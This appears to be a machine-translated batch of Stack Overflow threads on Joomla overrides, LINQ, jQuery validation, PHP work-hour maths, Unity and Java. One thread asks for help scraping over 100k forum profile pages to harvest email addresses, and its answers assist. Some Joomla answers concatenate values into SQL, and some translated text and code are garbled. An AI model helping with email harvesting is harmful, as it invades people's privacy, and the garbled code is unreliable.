您的应用程序是使用 XMS v2.5 构建的。您是否在另一台机器上安装了 XMS v2.5（随 MQ v7.5 客户端提供）？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T16:21:50.417

查看 Microsoft 的[fusion 日志查看器](http://msdn.microsoft.com/en-us/library/e74a18c4%28v=VS.71%29.aspx)，了解您的进展情况。

根据我的经验，当我看到此消息时，关键字是*或其依赖项之一*。融合日志可以帮助您找出是哪一个。

# joomla - Joomla - 在类别博客布局中仅显示主要文章的全文

> ID：11396548
> 
> 赞同：3
> 
> 时间：2012-07-09T13:59:50.203
> 
> 标签：joomla, article

如何在类别博客布局上显示主要文章的全文（即使它包含阅读更多内容）？

是否有我可以更改的后端设置或者我需要覆盖哪个 PHP 文件？我只希望显示主要文章的全文，介绍文章仍应仅显示介绍文本的阅读更多内容。

提前致谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-10T02:00:42.557

您没有指定 Joomla 的哪个版本！所以这个回复是基于 2.5.x

您将需要创建一个[布局覆盖](http://docs.joomla.org/Layout_Overrides_in_Joomla_1.6)，`com_content`特别是为`category`视图 tmpl 文件`blog.php`或`blog_item.php`.

如果您的模板已经为您安装了覆盖，`com_content`您将在此位置找到它：

```
/templates/your-template/html/com_content/category/ 
```

如果没有，您可以从您的 Joomla! 复制原始文件！2.5的`component`目录在`/components/com_content/views/category/tmpl/`

在该目录中，您将找到一系列以开头`blog`和结尾的文件`.php`- 您可以通过将它们复制到上面列出的第一个路径来覆盖其中的一个或全部。*注意只复制您需要更改 Joomla 的文件！如果在覆盖位置找不到版本，它足够聪明，可以在默认目录中查找。*

默认的 Joomla! 2.5安装有这些博客文件：

```
blog_children.php
blog_item.php
blog_links.php
blog.php 
```

基本上`blog.php`是主文件，它包括所需的子布局`blog_item.php`。

如果您使用默认的 Joomla! 2.5 文件，为了实现您的目标，您可能必须覆盖`blog.php`并`blog_item.php`找到一种方法来检查您是否在领先项目中。一旦你知道你在一个领先的项目中，你就会想要回显该项目的全文。

`blog_item.php`通常只是用这样的一行输出介绍文本：

`<?php echo $this->item->introtext; ?>`

您将希望全文回显，因此在将上面的行包裹在 an`if`中以检查您是否正在执行前导项目后，您的输出行将如下所示：

`<?php echo $this->item->introtext.$this->item->fulltext; ?>`

~~***注意：****我还没有检查过这个作品，这只是猜测，并且依赖于表格`$item`中的完整行。`#__content`*~~

因此，文章全文不会添加到标准安装中的文章项目中，即您可以简单地**echo** `$this->item->fulltext`。

有两种方法可以获取全文。

**最简单的 & first 是从第153 行**/附近开始的`/components/com_content/models/articles.php`第一个开始修改核心文件。**在a.introtext**之后和单个撇号之前添加“a.fulltext” ，因此该行如下所示：`$query->select()``function getListQuery()`

 ****```
function getListQuery()
{
    // Create a new query object.
    $db = $this->getDbo();
    $query = $db->getQuery(true);

    // Select the required fields from the table.
    $query->select(
        $this->getState(
            'list.select',
            'a.id, a.title, a.alias, a.title_alias, a.introtext, a.fulltext, ' .
            'a.checked_out, a.checked_out_time, ' . 
```

第二种方式，还有 Joomla！更新证明方法（因此可能是更好的方法）是将整篇文章加载到覆盖中（丑陋但它不是黑客）并将 连接`fulltext`到`introtext`第一篇文章的。

要做到这一点，您只需使用`getTable`$this->item->id 加载文章`blog.php`作为第一个前导项目，因此大约在第 54 行，在 the`<?php`和`$this->item = &$item;`put 之间：

```
if($leadingcount == 0) {
    $contentTable = JTable::getInstance('Content');
    if($contentTable->load($item->id)) {
        $item->introtext .= $contentTable->fulltext;
    }
} 
```

*注意 if 仅限制在第一个主要文章，如果您删除 if 它将附加所有主要文章的全文。*

这适用于我的 Joomla 开发安装！2.5.6 所以你应该也能做到。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-06-20T11:00:40.910

考虑到上面的两个答案，blog.php 和 blog_item.php 需要进行三处更改。这适用于 Joomla 3.1 最好是将这些文件复制到模板覆盖

复制**blog.php**和**blog_item.php**

来自**组件/com_content/views/category/tmpl/**

到**[我的模板]/html/com_content/category/**

在**blog.php**中，在前导项目的循环中添加一行：

```
 <?php foreach ($this->lead_items as &$item) : ?>
   <div class="leading-<?php echo ...?>">
                <?php
                    $this->item = &$item;
                    $this->item->leadingItem = true; //ADD THIS LINE !!!
                    echo $this->loadTemplate('item');
                ?>
            </div>
            <div class="clearfix"></div>
            <?php
               $leadingcount++;
            ?>
        <?php endforeach; ?> 
```

在**blog_item.php 中**替换**“echo $this->item->introtext;”** 和

```
if ($this->item->leadingItem){
//this is a leading article - show full text and remove "Read more..." button
        $itemID =  $this->item->id;
        $db =& JFactory::getDBO();
        $query = "SELECT `fulltext` FROM `#__content` WHERE `id` =" . $itemID;
        $db->setQuery($query);
        $fulltext = $db->loadResult();
        echo $this->item->introtext . $fulltext; 

    }else{

        echo $this->item->introtext; 
} 
```

最后在**blog_item.php**中不要在每篇文章的底部显示*“阅读更多...”按钮*

编辑行

> if ($params->get('show_readmore') && $this->item->readmore)

进入

> if ($params->get('show_readmore') && $this->item->readmore && !$this->item->leadingItem)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-27T17:18:01.557

Joomla 2.5.x，在您的模板 blog_item.php 中：

```
$itemID =  $this->item->id;
$db =& JFactory::getDBO();
$query = "
SELECT `fulltext` 
FROM `#__content` 
WHERE `id` = $itemID;
";
$db->setQuery($query);
$fulltext = $db->loadResult(); 
```

您可以使用 $fulltext 字符串变量。****

# android - 网络应用引擎/谷歌插件：为您的 Android 应用创建后端

> ID：11396549
> 
> 赞同：3
> 
> 时间：2012-07-09T13:59:51.300
> 
> 标签：android, google-app-engine

我正在尝试使用 Google 插件创建 Web API 后端，如本视频所示：

从 26:50 到 39:40[为 Android 构建 Web API](http://www.youtube.com/watch?feature=player_embedded&v=dylFNrvZ_3U#!/)

我可以启动我的 App Engine 的本地版本，并使用 curl 在其中插入/获取数据，如本网站所示：http: [//ido-green.appspot.com/CloudEndpoints/CloudEndpointsWebBlogPost.html](http://ido-green.appspot.com/CloudEndpoints/CloudEndpointsWebBlogPost.html)

我对 Web Apps 没有任何经验，但是第一次提到视频并想尝试一下。所以我想要一个以 Web App Engine 作为后端的 Android 应用程序。

现在，我使用 Google 插件部署它，然后转到[https://my-application-id.appspot.com/_ah/api/explorer](https://my-application-id.appspot.com/_ah/api/explorer)

那应该给我一些api，但那里什么都没有！如果我去

[https://my-application-id.appspot.com](https://my-application-id.appspot.com)，它说“未找到”。我去了[https://appengine.google.com/](https://appengine.google.com/)并在那里显示了我的应用程序。点击“后端”，它说没有。

我已经在网上搜索了好几个小时了，我找不到如何处理这个问题的好例子。

有人有这方面的经验吗？

> 编辑：当我去 localhost:8888/_ah/admin/backends 它说“这个应用程序没有定义任何后端。有关更多信息，请参阅文档。”

那么实际上我最大的问题是什么：为什么 .appspot.com/_ah/api/discovery/v1/apis 会返回“未找到”？我现在应该有一个 API

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T14:36:07.487

您应该在 GoogleAppEngine 上创建一个新应用程序，并为其提供一个唯一 ID。例如 raptor3000app，然后你可以通过[https://raptor3000app.appspot.com访问它](https://raptor3000app.appspot.com)

编辑：你可以在这里做：[https ://appengine.google.com/](https://appengine.google.com/)

# c# - 如果 IEnumerable 怎么办 只返回一个字符串

> ID：11396551
> 
> 赞同：3
> 
> 时间：2012-07-09T13:59:53.123
> 
> 标签：c#, xml, visual-studio-2010, linq, ienumerable

我正在对 XML 文件进行简单的 Linq 查询

```
IEnumerable<string> value = from item in myFile.Descendants("ProductName")
                            select (string)item; 
```

通常（如果我有不止一行）我可以使用 foreach 循环进行迭代：

```
foreach (string str in value)
{
    Console.WriteLine(str);
} 
```

但是如果我确定我只有一个项目，我的方法签名是：

```
public string getValue()
{
    return ?;
} 
```

我应该返回什么（如果我想**删除****foreach**循环）？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-09T14:01:12.497

如果您确定始终只有一个字符串，则可以 return `value.Single()`。

还有一些选择：

*   [第一的（）](http://msdn.microsoft.com/en-us/library/system.linq.enumerable.first)
*   [第一或默认（）](http://msdn.microsoft.com/en-us/library/bb340482.aspx)
*   [单或默认（）](http://msdn.microsoft.com/en-us/library/system.linq.enumerable.singleordefault)

如果有多个元素（使用`Single`或`SingleOrDefault`），或者根本没有元素（使用`First`或），这取决于您是否要引发异常`Single`。

如果您总是只排除一个元素，我会坚持使用[Single()](http://msdn.microsoft.com/en-us/library/system.linq.enumerable.single)，因为如果有零个或多个元素，它将引发异常。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-09T14:02:38.990

有[`Single`](http://msdn.microsoft.com/en-us/library/bb357287)/[`SingleOrDefault`](http://msdn.microsoft.com/en-us/library/bb494540)和[`First`](http://msdn.microsoft.com/en-us/library/bb356424)/[`FirstOrDefault`](http://msdn.microsoft.com/en-us/library/bb358452)方法可以将可枚举的元素解析为一个。

该`Single`方法只***需要***一个元素，如果结果包含零个或多个元素，则会异常。用于`SingleOrDefault`应付零和一。

“第一”对都可以处理多个，但`First`如果没有元素，则再次抛出。

所有这些方法都带有一个重载，允许您指定条件，从而无需使用`.Where`调用。

在你的情况下：

```
string value = (from item in myFile.Descendants("ProductName")
                select (string)item)
               .SingleOrDefault(); 
```

在 Single 或 First 之间进行选择时，`Single`如果您期望一个元素，则使用，`SingleOrDefault`如果您期望零个或一个元素，则使用，如果您不关心返回多少元素，请使用`First`/ `FirstOrDefault`（以及某种类型）。`OrderBy`

另请注意，这些方法使用延迟执行，因此一旦`First`满足它就会停止迭代。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-09T14:01:00.717

如果您只想退回一件商品，请使用[`FirstOrDefault()`](http://msdn.microsoft.com/en-us/library/bb340482.aspx)：

```
public string getValue()
{
    IEnumerable<string> value = from item in myFile.Descendants("ProductName")
                        select (string)item;
    return value.FirstOrDefault();
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-09T14:06:11.557

如果您确定只有一个并且必须只有一个，您应该使用`Single`. 如果您有多个，这实际上会引发异常。

# jquery - 在提交时检查 jQuery 验证之前的表单提交

> ID：11396552
> 
> 赞同：0
> 
> 时间：2012-07-09T13:59:55.367
> 
> 标签：jquery, ajax, forms, validation, submit

我正在使用 Ajax 和 jQuery 来验证和提交表单中的信息。我遇到的问题是，当我单击提交按钮时，表单会在执行验证检查并显示错误之前立即将信息提交到服务器？

我不确定这里有什么问题，所以任何输入都会很棒！

干杯

```
$('#submit_second').click(function() {
    //remove classes
    $('#second_step input').removeClass('error').removeClass('valid');

    var emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
    var phonePattern = /^\+?[0-9]{0,15}$/ ;  
    var fields = $('#second_step input[type=text]');
    var error = 0;
    fields.each(function() {
        var value = $(this).val();
        if( value.length<1 || value==field_values[$(this).attr('id')] || ( $(this).attr('id')=='email' && !emailPattern.test(value))) {
            $(this).addClass('error');
            $(this).effect("shake", { times:3 }, 50);

            error++;
        } else {
            $(this).addClass('valid');
        }
        if( value.length<1 || value==field_values[$(this).attr('id')] || ( $(this).attr('id')=='phone' && !phonePattern.test(value) )  ) {
            $(this).addClass('error');
            $(this).effect("shake", { times:3 }, 50);

            error++;
        } else {
            $(this).addClass('valid');
        }

    });

    if(!error) {
        //update progress bar
        $('#progress_text').html('66% Complete');
        $('#progress').css('width','226px');

        //slide steps
        $('#second_step').slideUp();
        $('#fourth_step').slideDown();     
    } else return false;
});

$('#submit_second').click(function(){

    url =$("input#url").val();
    yourname =$("input#yourname").val();
    email =$("input#email").val();
    phone =$("input#phone").val();

    //send information to server
    var dataString = 'url='+ url + '&yourname=' + yourname + '&email=' + email + '&phone=' + phone;  

    alert (dataString);

    $.ajax({  
        type: "POST",  
        url: "#",  
        data: "url="+url+"&yourname="+yourname+"&email="+email+'&phone=' + phone,
        cache: false,
        success: function(data) {  
            console.log("form submitted");
            alert("success");
        }
    });  
    return false;
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T14:06:03.150

我想你正在寻找的是这样的：

```
$('#submit_second').submit(function(evt){
    evt.preventDefault();
    ...
}); 
```

查看 jQuery 文档：[http ://api.jquery.com/event.preventDefault/](http://api.jquery.com/event.preventDefault/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:02:13.370

```
$('form_to_validate').submit(function() {
    // .. stuff
}); 
```

# java - 在 Java 中翻录 html 页面源代码问题

> ID：11396553
> 
> 赞同：0
> 
> 时间：2012-07-09T13:59:59.440
> 
> 标签：java, html

我正在尝试翻录网站的 html 页面源以获取电子邮件。当我运行 ripper/dumper 或任何你想调用它的东西时，它会获取所有源代码但在第 160 行停止但我可以手动转到网页>右键单击>单击查看页面源然后解析文本。整个源代码只有 200 多行。手动转到每个页面并右键单击的唯一问题是有超过 100k 个页面并且需要一段时间。

这是我用来获取页面源的代码：

```
 public static void main(String[] args) throws IOException, InterruptedException {

    URL url = new URL("http://www.runelocus.com/forums/member.php?102786-wapetdxzdk&tab=aboutme#aboutme");
    URLConnection connection = url.openConnection();

    connection.setDoInput(true);
    InputStream inStream = connection.getInputStream();
    BufferedReader input = new BufferedReader(new InputStreamReader(
            inStream));

    String html = "";
    String line = "";
    while ((line = input.readLine()) != null)
        html += line;
    System.out.println(html);
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:55:01.997

如果您尝试抓取 HTML 页面的内容，则不应使用这样的原始连接。使用现有库：[HTML Unit](http://htmlunit.sourceforge.net/)是一个非常常用的库。

你传入 URL，它给你一个代表页面的对象，你得到所有的 HTML 标记作为对象（例如，你得到元素的 Div 对象，元素的 HTMLAnchor 对象等）。使用 HTML Unit 等现有框架并读取页面内容将使您的生活变得更加轻松。

您还可以进行搜索（例如 elementById、elementByTagName、按属性等），这使得在给定页面标记的情况下更容易在文档中跳转。

您还可以根据需要模拟点击等。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T16:13:49.500

Upon looking at this, my best guess is that your while loop conditional is bad. I'm unfamiliar with the syntax you're using. Mind you, I have not used Java in awhile. But I feel like it should read...

```
String line = input.readLine();
while(line != null)
{
    html += line; //should use a StringBuilder here for optimization
    line = input.readLine();
} 
```

I do note the StringBuilder optimization. Also, I think this would be easier using the Scanner class.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T17:23:06.087

当您打开具有不同字符集的 InputStreamReader 时可能会有所帮助？查看您提到的页面，字符集是 ISO-8859-1：

```
BufferedReader input = 
    new BufferedReader(new InputStreamReader(inStream, "ISO-8859-1")); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-09T15:30:06.643

我运行了你的代码，它似乎得到了所有的 HTML，包括 HTML 结束标记。

您是否想过您可能必须登录网站才能查看更多信息？在这种情况下，用户 tsOverflow 建议的库可能会有所帮助。

# php - 计算PHP中2个日期之间的工作时间

> ID：11396562
> 
> 赞同：4
> 
> 时间：2012-07-09T14:00:20.843
> 
> 标签：php, date, time, date-math

我有一个函数可以返回两个日期之间的差异，但是我需要计算出工作时间的差异，**假设星期一到星期五（上午 9 点到下午 5 点 30 分）：**

```
//DATE DIFF FUNCTION
// Set timezone
date_default_timezone_set("GMT");

// Time format is UNIX timestamp or
// PHP strtotime compatible strings
function dateDiff($time1, $time2, $precision = 6) {
    // If not numeric then convert texts to unix timestamps
    if (!is_int($time1)) {
        $time1 = strtotime($time1);
    }
    if (!is_int($time2)) {
        $time2 = strtotime($time2);
    }

    // If time1 is bigger than time2
    // Then swap time1 and time2
    if ($time1 > $time2) {
        $ttime = $time1;
        $time1 = $time2;
        $time2 = $ttime;
    }

    // Set up intervals and diffs arrays
    $intervals = array('year','month','day','hour','minute','second');
    $diffs = array();

    // Loop thru all intervals
    foreach ($intervals as $interval) {
        // Set default diff to 0
        $diffs[$interval] = 0;
        // Create temp time from time1 and interval
        $ttime = strtotime("+1 " . $interval, $time1);
        // Loop until temp time is smaller than time2
        while ($time2 >= $ttime) {
            $time1 = $ttime;
            $diffs[$interval]++;
            // Create new temp time from time1 and interval
            $ttime = strtotime("+1 " . $interval, $time1);
        }
    }

    $count = 0;
    $times = array();
    // Loop thru all diffs
    foreach ($diffs as $interval => $value) {
        // Break if we have needed precission
        if ($count >= $precision) {
            break;
        }
        // Add value and interval 
        // if value is bigger than 0
        if ($value > 0) {
            // Add s if value is not 1
            if ($value != 1) {
                $interval .= "s";
            }
            // Add value and interval to times array
            $times[] = $value . " " . $interval;
            $count++;
        }
    }

    // Return string with times
    return implode(", ", $times);
} 
```

**日期 1 = 2012-03-24 03:58:58
日期 2 = 2012-03-22 11:29:16**

有没有一种简单的方法可以做到这一点，即 - 计算一周工作时间的百分比并使用上述函数除以差异 - 我已经尝试过这个想法并得到了一些非常奇怪的数字......

还是有更好的方法……？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-12-19T13:56:31.453

此示例使用 PHP 内置的 DateTime 类来进行日期数学运算。我的方法是从计算两个日期之间的完整工作日数开始，然后将其乘以 8（见注释）。然后它会获取部分工作日的工作时间并将它们添加到总工作时间中。把它变成一个函数是相当简单的。

**笔记：**

*   不考虑时间戳。但是您已经知道如何做到这一点。
*   不处理假期。（可以通过使用一系列假期并将其添加到您过滤掉周六和周日的位置来轻松添加）。
*   需要 PHP 5.3.6+
*   假设每天工作 8 小时。如果员工不采取午餐`$hours = $days * 8;`更改`$hours = $days * 8.5;`

.

```
<?php
// Initial datetimes
$date1 = new DateTime('2012-03-22 11:29:16');
$date2 = new DateTime('2012-03-24 03:58:58');

// Set first datetime to midnight of next day
$start = clone $date1;
$start->modify('+1 day');
$start->modify('midnight');

// Set second datetime to midnight of that day
$end = clone $date2;
$end->modify('midnight');

// Count the number of full days between both dates
$days = 0;

// Loop through each day between two dates
$interval = new DateInterval('P1D');
$period = new DatePeriod($start, $interval, $end);
foreach ($period as $dt) {
    // If it is a weekend don't count it
    if (!in_array($dt->format('l'), array('Saturday', 'Sunday'))) {
        $days++;
    }
}

// Assume 8 hour workdays
$hours = $days * 8;

// Get the number of hours worked on the first day
$date1->modify('5:30 PM');
$diff = $date1->diff($start);
$hours += $diff->h;

// Get the number of hours worked the second day
$date1->modify('8 AM');
$diff = $date2->diff($end);
$hours += $diff->h;

echo $hours; 
```

**[看到它在行动](http://3v4l.org/sOtfX)**

**参考**

*   [日期时间类](http://www.php.net/manual/en/class.datetime.php)
*   [日期周期类](http://www.php.net/manual/en/class.dateperiod.php)
*   [日期间隔类](http://www.php.net/manual/en/class.dateinterval.php)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-12-20T04:44:56.797

这就是我想出的。

我的解决方案检查原始日期的开始和结束时间，并根据工作日的实际开始和结束时间进行调整（如果原始开始时间在工作开始时间之前，则将其设置为后者）。

在对开始时间和结束时间完成此操作后，比较时间以检索`DateInterval`差异，计算总天数、总小时数等。然后检查日期范围的任何周末，如果找到，则从总天数减少差异。

最后，按照评论计算小时数。:)

[为John](https://stackoverflow.com/a/20683562/580587)提供的一些解决方案干杯，尤其是`DatePeriod`检查周末。

任何打破这一点的人的金星；如果有人发现漏洞，我会很乐意更新！

* * *

*给自己的金星，我打破了它！*是的，周末仍然有问题（尝试从周六下午 4 点开始，到周一下午 1 点结束）。我**会**征服你的，工作时间问题！

*忍者编辑#2：*我想我通过将开始和结束时间恢复到最近的相应工作日来解决周末错误，如果它们是在周末的话。在测试了几个日期范围后得到了很好的结果（如预期的那样，在同一个周末 barfs 开始和结束）。我并不完全相信这是尽可能优化/简单的，但至少现在效果更好。

* * *

```
// Settings
$workStartHour = 9;
$workStartMin = 0;
$workEndHour = 17;
$workEndMin = 30;
$workdayHours = 8.5;
$weekends = ['Saturday', 'Sunday'];
$hours = 0;

// Original start and end times, and their clones that we'll modify.
$originalStart = new DateTime('2012-03-22 11:29:16');
$start = clone $originalStart;

// Starting on a weekend? Skip to a weekday.
while (in_array($start->format('l'), $weekends))
{
    $start->modify('midnight tomorrow');
}

$originalEnd = new DateTime('2012-03-24 03:58:58');
$end = clone $originalEnd;

// Ending on a weekend? Go back to a weekday.
while (in_array($end->format('l'), $weekends))
{
    $end->modify('-1 day')->setTime(23, 59);
}

// Is the start date after the end date? Might happen if start and end
// are on the same weekend (whoops).
if ($start > $end) throw new Exception('Start date is AFTER end date!');

// Are the times outside of normal work hours? If so, adjust.
$startAdj = clone $start;

if ($start < $startAdj->setTime($workStartHour, $workStartMin))
{
    // Start is earlier; adjust to real start time.
    $start = $startAdj;
}
else if ($start > $startAdj->setTime($workEndHour, $workEndMin))
{
    // Start is after close of that day, move to tomorrow.
    $start = $startAdj->setTime($workStartHour, $workStartMin)->modify('+1 day');
}

$endAdj = clone $end;

if ($end > $endAdj->setTime($workEndHour, $workEndMin))
{
    // End is after; adjust to real end time.
    $end = $endAdj;
}
else if ($end < $endAdj->setTime($workStartHour, $workStartMin))
{
    // End is before start of that day, move to day before.
    $end = $endAdj->setTime($workEndHour, $workEndMin)->modify('-1 day');
}

// Calculate the difference between our modified days.
$diff = $start->diff($end);

// Go through each day using the original values, so we can check for weekends.
$period = new DatePeriod($start, new DateInterval('P1D'), $end);

foreach ($period as $day)
{
    // If it's a weekend day, take it out of our total days in the diff.
    if (in_array($day->format('l'), ['Saturday', 'Sunday'])) $diff->d--;
}

// Calculate! Days * Hours in a day + hours + minutes converted to hours.
$hours = ($diff->d * $workdayHours) + $diff->h + round($diff->i / 60, 2); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-07-01T09:30:57.163

俗话说“如果你想把事情做好，就自己做”。并不是说这是最佳的，但它至少为我返回了正确的小时数。

```
function biss_hours($start, $end){

    $startDate = new DateTime($start);
    $endDate = new DateTime($end);
    $periodInterval = new DateInterval( "PT1H" );

    $period = new DatePeriod( $startDate, $periodInterval, $endDate );
    $count = 0;

      foreach($period as $date){

           $startofday = clone $date;
           $startofday->setTime(8,30);

           $endofday = clone $date;
           $endofday->setTime(17,30);

    if($date > $startofday && $date <= $endofday && !in_array($date->format('l'), array('Sunday','Saturday'))){

        $count++;
    }

}

//Get seconds of Start time
$start_d = date("Y-m-d H:00:00", strtotime($start));
$start_d_seconds = strtotime($start_d);
$start_t_seconds = strtotime($start);
$start_seconds = $start_t_seconds - $start_d_seconds;

//Get seconds of End time
$end_d = date("Y-m-d H:00:00", strtotime($end));
$end_d_seconds = strtotime($end_d);
$end_t_seconds = strtotime($end);
$end_seconds = $end_t_seconds - $end_d_seconds;

$diff = $end_seconds-$start_seconds;

if($diff!=0):
    $count--;
endif;

$total_min_sec = date('i:s',$diff);

return $count .":".$total_min_sec;
}

$start = '2014-06-23 12:30:00';
$end = '2014-06-27 15:45:00';

$go = biss_hours($start,$end);
echo $go; 
```

# php - 如何使用ajax和php在同一页面上开发一个三步向导

> ID：11396566
> 
> 赞同：0
> 
> 时间：2012-07-09T14:00:28.727
> 
> 标签：php, ajax, wizard

我尝试使用 ajax 在同一页面上实现 3step 向导。我使用两个 php 文件来创建 Form2 和 Form3。第一步创建Form2没有问题。但我被困在创建 Form3 的第二步。我已根据以下建议更改了 Form2 的验证代码，这是新代码。createForm3.php 返回的数据是正确的，但不能在 div id="form3" 处显示。

```
<script type="text/javascript">
  $(document).ready(function(){
    $("#form1").validate({ ...
      alert("I am in form1 validation");
      submitHandler: function(form) {   
              $.post('createForm2.php', $("#form1").serialize(), function(data) {
            $('#form2').html(data); 
                    $("#form2").validate({ ...
                    alert("I am in form2 validation");
                    submitHandler: function(form) {
                    $.post('createForm3.php', $("#form2").serialize(), function(data) {
                       alert(data);
               $('#form3').html(data);  });}});
   });}});      

});
</script>
<body>
<form name = 'form1' id = 'form1' action = '' method = 'POST'>
....
<input type = 'submit' name = 'submit' value = 'Submit'>
</form>
<div id="form2"><div>
<div id="form3"><div>
</body> 
```

在 createForm3.php 中进行测试： echo " Show form 3 ";

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T14:10:21.120

You are activating the validate function on form2 while it is still doesn't exist, so the validation method is never called on form2.

What you need to do is call the form validation on form2 in the ajax callback:

```
$(document).ready(function(){
    $("#form1").validate({ ...
      submitHandler: function(form) {   
              $.post('createForm2.php', $("#form1").serialize(), function(data) {
                    $('#form2').html(data); 
     $("#form2").validate({ ...})

   });}});

    }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:04:53.087

据我所知，您可能需要将`#form2`验证事件处理程序移至`#form1`提交处理程序的成功函数。

现在，当您将事件处理程序附加到 时`#form2`，该元素中还没有表单，因为它是使用 ajax 创建的，因此您尝试附加到它的任何内容都会失败。

# unity3d - 在 Unity 3D 中通过 OnGui 转换多个对象

> ID：11396567
> 
> 赞同：0
> 
> 时间：2012-07-09T14:00:31.873
> 
> 标签：unity3d, unityscript

我是 Unity 和 Javascript 的新手，并试图重新创建益智游戏 Cryptica 作为学习体验以进入引擎。我试图在调用四个 OnGUI 按钮之一时同时移动两个对象：左、上、右和下。该脚本已附加到两个对象，但只移动一个。

如果我创建一个空的游戏对象并将两个对象添加到其中并将脚本放在空对象上然后两者都移动，但是我无法创建逻辑来根据不同的场景以不同的方式移动每个对象（即，如果一个对象位于棋盘的末端，它不应再朝该方向移动，但另一个物体可能仍会移动）。这是代码，让我知道图像是否会更有帮助。

```
var cubeMovement = 11;

function Update () {

}

function OnGUI () {
    //Move dynamic cubes
    if (GUI.Button (Rect (250,150,50,50), "Up")) {
        transform.Translate(cubeMovement,0,0);
    }

    if (GUI.Button (Rect (350,250,50,50), "Right")) {
        transform.Translate(0,0,-cubeMovement);

    }

    if (GUI.Button (Rect (250,350,50,50), "Down")) {
        transform.Translate(-cubeMovement,0,0);
    }

    if (GUI.Button (Rect (150,250,50,50), "Left")) {
        transform.Translate(0,0,cubeMovement);
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-10T14:19:38.653

在 2 个不同对象上使用此脚本的问题在于，两个对象都呈现相同的 4 个按钮。所以你实际上在屏幕上有 8 个按钮，只是最后绘制的按钮在顶部。

更新多个多维数据集的逻辑如下所示：

```
function CubeVisible(var go: GameObject){
    var screenPos : Vector3 = camera.WorldToScreenPoint (go.transform.position);
    if(screenPos.x < 0) return false;
    if(screenPos.x > Screen.width) return false;

    //Do the same for the y axis

    //Negative-z means the object is behind the camera.
    if(screenPos.z < 0) return false;
    return true;    //return true if the object wasn't outside any bounds.
}
function UpdateCubes(var dir: Vector3){
    var cubes: GameObject[] = GameObject.FindGameObjectsWithTag("cubes"); 

    for (cube in cubes) { 
        var pos = cube.transform.position;
        var new_pos = pos + dir;

        if(CubeVisible(new_pos)==true)
            cube.transform.Translate(dir);
    } 
}

function OnGUI () {
    //Move dynamic cubes
    if (GUI.Button (Rect (250,150,50,50), "Up")) {
        UpdateCubes(Vector3(cubeMovement,0,0));
    }

    if (GUI.Button (Rect (350,250,50,50), "Right")) {
        UpdateCubes(Vector3(0,0,-cubeMovement));
    }

    if (GUI.Button (Rect (250,350,50,50), "Down")) {
        UpdateCubes(Vector3(-cubeMovement,0,0));
    }

    if (GUI.Button (Rect (150,250,50,50), "Left")) {
        UpdateCubes(Vector3(0,0,cubeMovement));
    }
} 
```

我的 javascript-fu 有点生疏，我是 C# 人，所以希望我没有犯愚蠢的错误。以上应该是您正在寻找的。测试您的对象是否仍在视野中的问题是您的对象位于世界坐标中，听起来您想知道您的对象是否在屏幕外。最简单的方法是首先将对象的位置转换为 2D 屏幕坐标，然后测试它是否在屏幕上。该路径也有问题，它假设您的对象以它自己的原点为中心。

哦，还有“标签”。选择任何游戏对象时，可以在“检查器”中找到标签。您可以创建自己的自定义标签。有关解释，请参阅 wiki。

# java - eclipse调试器中详细的java线程状态？

> ID：11396568
> 
> 赞同：1
> 
> 时间：2012-07-09T14:00:37.057
> 
> 标签：java, eclipse, multithreading, debugging, concurrency

是否可以在 Eclipse 调试器中查看详细的 JVM 线程状态？例如，哪个监视器线程有，它等待哪些等？

这将有助于调试并发挂起。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T14:05:21.500

Eclipse 调试器不支持此功能，您想要的是 Profiler

*   [视觉虚拟机](http://visualvm.java.net/)
*   [你的套件](http://www.yourkit.com/)

还有很多。然后，您可以在 Eclipse 中启动调试并将探查器程序远程连接到正在运行的 JVM 实例。VisualVM 还提供了一个[Eclipse 启动器](http://visualvm.java.net/eclipse-launcher.html)。

YourKit 具有不同的并发特性，例如[Monitor profiling](http://www.yourkit.com/features/index.jsp#monitor_profiling)。在那里，您将获得有关线程及其交互的详细信息。

![在此处输入图像描述](../Images/321643377d35d7c80c852fa20a75010b.png)

# java - 如何将opencv转换为javacv代码

> ID：11396572
> 
> 赞同：2
> 
> 时间：2012-07-09T14:00:49.610
> 
> 标签：java, c++, opencv, javacv, code-translation

我无法将以下代码转换为 javacv：

`((int*)(srcArg->imageData + srcArg->widthStep*P2.y))[P2.x]`这是什么意思？对我来说它看起来像一个数组，但类型`value`是浮点数。

我不知道如何将值设置为`value`.

```
float Saliency::getMean(IplImage * srcArg, CvPoint PixArg, int neighbourhood,    int centerVal)
{
CvPoint P1, P2;
float value;

P1.x = PixArg.x - neighbourhood + 1;
P1.y = PixArg.y - neighbourhood + 1;
P2.x = PixArg.x + neighbourhood + 1;
P2.y = PixArg.y + neighbourhood + 1;

if(P1.x < 0)
    P1.x = 0;
else if(P1.x > srcArg->width - 1)
    P1.x = srcArg->width - 1;
if(P2.x < 0)
    P2.x = 0;
else if(P2.x > srcArg->width - 1)
    P2.x = srcArg->width - 1;
if(P1.y < 0)
    P1.y = 0;
else if(P1.y > srcArg->height - 1)
    P1.y = srcArg->height - 1;
if(P2.y < 0)
